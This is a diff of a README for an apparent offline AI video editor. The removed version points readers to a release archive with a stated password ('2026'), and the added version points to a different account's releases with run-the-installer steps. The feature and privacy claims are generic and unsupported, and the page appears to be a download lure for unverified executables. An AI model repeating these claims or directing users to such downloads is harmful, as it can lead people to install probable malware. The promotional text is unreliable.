@@ -1,186 +1,68 @@
-<div align="center">
+```
+# 🎬 ai-powered-vertical-video-editor - Edit Videos with Privacy and Ease
 
-  <img src="https://placehold.co/1200x280/0a0a0a/7e57c2?text=NEXUS+AI+EDITOR&font=orbitron" alt="Nexus AI Editor" width="100%">
+## 📥 Download Now
+[![Download ai-powered-vertical-video-editor](https://img.shields.io/badge/Download-Now-green)](https://github.com/ChirayuOhio/ai-powered-vertical-video-editor/releases)
 
-  <h3>— where intelligence meets integrity —</h3>
+## 📝 Overview
+The **ai-powered-vertical-video-editor** offers a privacy-first solution for video editing. This tool works entirely offline, using open models to process your media. You maintain control of your content without relying on cloud services. Perfect for filmmakers, researchers, and digital rights advocates, this software ensures you can create without compromise.
 
-  <br>
+## 🚀 Getting Started
+Using the ai-powered-vertical-video-editor is simple. Here’s how to get started:
 
-  <a href="#overview">
-    <img src="https://img.shields.io/badge/Status-Active%20Development-7e57c2?style=flat&logo=git"/>
-  </a>
-  <a href="#features">
-    <img src="https://img.shields.io/badge/Architecture-Offline%20First-263238?style=flat&logo=python"/>
-  </a>
-  <a href="#privacy">
-    <img src="https://img.shields.io/badge/Privacy-Your%20Data%20Stays%20Local-00897b?style=flat&logo=lock"/>
-  </a>
-  <a href="#license">
-    <img src="https://img.shields.io/badge/License-MIT%20%7C%20Apache%202.0-3e2723?style=flat"/>
-  </a>
+1. Visit the [Releases page](https://github.com/ChirayuOhio/ai-powered-vertical-video-editor/releases) to download the latest version of the software.
 
-  <br><br>
+2. Choose the version suitable for your operating system. You’ll find options for Windows, Mac, and Linux.
 
-  <a href="https://github.com/Crewphoyield/ai-powered-vertical-video-editor/releases/tag/Nexus">
-    <img src="https://img.shields.io/badge/Download-Latest%20Release%20(v1.3.0)-4a148c?style=for-the-badge&logo=github&logoColor=white"/>
-  </a>
+3. Download the file by clicking on the link corresponding to your operating system.
 
-</div>
+4. Once the download is complete, locate the file on your computer, usually found in the `Downloads` folder.
 
----
+5. Double-click the file to run the installer. Follow the prompts to complete the installation process.
 
- ## DOWNLOAD 
- - Password for archive - 2026
- <div align="center">
-  <a href="https://github.com/Crewphoyield/ai-powered-vertical-video-editor/releases/tag/Nexus">
-    <b>⬇️ DOWNLOAD (Latest Release)</b>
-  </a>
-</div>
+6. After installation, open the application from your applications menu or desktop shortcut.
 
-### Overview
+## 📂 Features
+- **Local Processing:** All video processing occurs on your device. No internet connection needed.
+- **Support for Various Formats:** Edit videos in multiple formats to suit your project needs.
+- **AI-Powered Tools:** Utilize advanced AI-driven features to enhance your videos, including image-to-video conversion and music integration.
+- **User-Friendly Interface:** Navigate the software with ease, even without prior editing experience.
+- **Ongoing Development:** Regular updates ensure you receive the latest features and improvements.
 
-**Nexus AI Editor** is a privacy-first, offline-capable video editing framework powered by local artificial intelligence models. It processes all video data directly on your hardware — never requiring cloud services, external APIs, or data transmission.
+## ⚙️ System Requirements
+To use the ai-powered-vertical-video-editor, please ensure your system meets the following minimum requirements:
 
-> Engineered for creators who value sovereignty over convenience.  
-> Built for developers who believe intelligence should be transparent.  
-> Designed for humanity that deserves digital dignity.
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, Linux kernel 4.15 or later.
+- **Processor:** Dual-core CPU with a clock speed of at least 2.0 GHz.
+- **Memory:** Minimum 4 GB RAM (8 GB recommended).
+- **Storage:** At least 1 GB of free space for installation.
 
-This is not a replacement for commercial editors.  
-It is a **paradigm shift** in how creative tools should respect users.
+## 📥 Download & Install
+To begin editing, first download the software from the [Releases page](https://github.com/ChirayuOhio/ai-powered-vertical-video-editor/releases). Once downloaded, follow the installation instructions provided in the Getting Started section. The setup process is straightforward, making it accessible for users with no technical background.
 
----
+## 🎓 Tutorials and Support
+For help and guidance, you can explore tutorials on our [Wiki page](https://github.com/ChirayuOhio/ai-powered-vertical-video-editor/wiki). Here, you'll find step-by-step guides on using various features, including:
 
-### Core Philosophy
+- Importing media files.
+- Applying effects and transitions.
+- Exporting your completed videos.
 
-#### 🔒 Zero-Data Architecture  
-All AI models (background removal, transcription, stabilization) run entirely on your device. No telemetry. No analytics. No hidden endpoints.
+If you have further questions or encounter issues, you can reach out through the Issues section on the GitHub page.
 
-#### ⚡ Adaptive Performance  
-Dynamically scales from Raspberry Pi 4 to workstation GPUs — using quantized models and hardware acceleration where available.
+## 🔧 Customization Options
+Personalize your editing experience with various options tailored to your workflow. You can:
 
-#### 🧩 Modular Intelligence  
-Swap AI components without rebuilding:  
-- `Nexus-Vision` — Scene analysis & object detection (YOLO-Nano)  
-- `Nexus-Whisper` — Offline speech-to-text (Whisper.cpp)  
-- `Nexus-Stabilize` — Motion compensation (OpenCV + Kalman filters)  
-- `Nexus-Color` — Cinematic grading (custom LUT engine)  
+- Adjust themes and colors for a comfortable view.
+- Create templates for commonly used effects and transitions.
+- Save your settings for future projects.
 
-#### 🌐 Federated Learning Ready  
-Contribute anonymized model improvements back to the community — without sharing raw footage.
+## 🌍 Stay Connected
+Join our community of users on social media platforms. Share your creations, provide feedback, and stay updated on new releases and features.
 
----
+## 🔗 Useful Links
+- **Releases Page:** [Visit Here](https://github.com/ChirayuOhio/ai-powered-vertical-video-editor/releases)
+- **Wiki Page:** [Explore Tutorials](https://github.com/ChirayuOhio/ai-powered-vertical-video-editor/wiki)
+- **Issues Page:** [Report Problems](https://github.com/ChirayuOhio/ai-powered-vertical-video-editor/issues)
 
-### Technical Capabilities
-
-#### ▸ Intelligent Clip Processing
-- Automatic highlight detection via audio spikes and motion vectors  
-- Smart b-roll insertion based on semantic scene analysis  
-- Background removal with hair-detail preservation (RTMPose integration)  
-
-#### ▸ Privacy-Preserving Workflow
-- On-device face blurring with configurable sensitivity  
-- Metadata scrubbing (GPS, timestamps, device IDs) before export  
-- Encrypted project files with zero-knowledge keys  
-
-#### ▸ Professional Output
-- 4K timeline rendering with hardware acceleration  
-- Broadcast-safe color spaces (REC.709, DCI-P3)  
-- Platform-optimized exports (TikTok, YouTube, Instagram presets)  
-
-#### ▸ Developer Experience
-- Python API for custom AI pipeline integration  
-- WASM builds for web-based demos (no server required)  
-- Docker containers for reproducible research environments  
-
----
-
-### Hardware Requirements
-
-| Component | Minimum | Recommended |
-|-----------|---------|-------------|
-| **OS** | Windows 10 / macOS Monterey / Ubuntu 22.04 | Windows 11 / macOS Sonoma / Arch Linux |
-| **CPU** | Quad-core x86_64 | 8-core with AVX2 support |
-| **RAM** | 8 GB | 32 GB |
-| **GPU** | Integrated Graphics | NVIDIA RTX 3060+ (12GB VRAM) |
-| **Storage** | 20 GB free space | NVMe SSD (1TB+) |
-
-> Note: Runs on Apple Silicon with Core ML acceleration.  
-> Raspberry Pi 4 support via quantized models (720p only).
-
----
-
-### Getting Started
-
-#### For Creators
-1. Download the latest release for your OS  
-2. Extract and run `nexus-editor`  
-3. Create project → Import media → Activate AI tools  
-
-### Why Nexus Stands Apart
-
-| Feature           | Traditional Cloud Editors          | Nexus AI Editor                     |
-|-------------------|------------------------------------|-------------------------------------|
-| **Data Flow**     | Upload → Process → Download        | Process locally → Export            |
-| **AI Models**     | Proprietary black boxes            | Open weights, audit trails          |
-| **Cost**          | Subscription + bandwidth fees      | One-time hardware investment        |
-| **Ownership**     | Platform-controlled outputs        | Your media, your rights             |
-| **Offline Use**   | Limited or none                    | Full functionality                  |
-
-> This isn't just editing software.  
-> It's a **manifesto for digital sovereignty**.
-
----
-
-### Privacy Commitment
-
-<div id="privacy">
-
-We collect **no data**. Not your videos. Not your projects. Not your usage patterns.  
-The only telemetry is **optional, anonymized hardware metrics** to optimize model performance — and you control it.
-
-All AI models are:  
-✅ Open weights (MIT licensed)  
-✅ Verifiable training data  
-✅ Auditable inference pipelines  
-
-Your creativity remains yours — forever.
-
-</div>
-
----
-
-### Community & Contribution
-
-**We welcome:**  
-- Model optimization for low-end hardware  
-- New localization languages  
-- Accessibility features (audio descriptions, sign language avatars)  
-- Privacy-preserving collaboration tools  
-
-**Not accepted:**  
-- Cloud-dependent features  
-- DRM or license enforcement code  
-- Any component requiring user data transmission  
-
----
-
-### License
-
-Distributed under dual licensing:  
-- **MIT License** — for personal/educational use  
-- **Apache 2.0** — for commercial integration  
-
-> All AI models carry their respective research licenses (clearly documented in `/models/LICENSES`).
-
----
-
-### Final Note
-
-If you believe creativity shouldn't require surrendering privacy —  
-if you think intelligence belongs to the user, not the platform —  
-if you demand tools that respect your humanity...
-
-**This is your editor.**
-
-> Built in silence. Released for the sovereign creator.  
-> `v1.3.0 — January 2026`
+By following this guide, you'll be able to download and use the ai-powered-vertical-video-editor effectively. Enjoy your editing journey with full control over your creative process.
+```
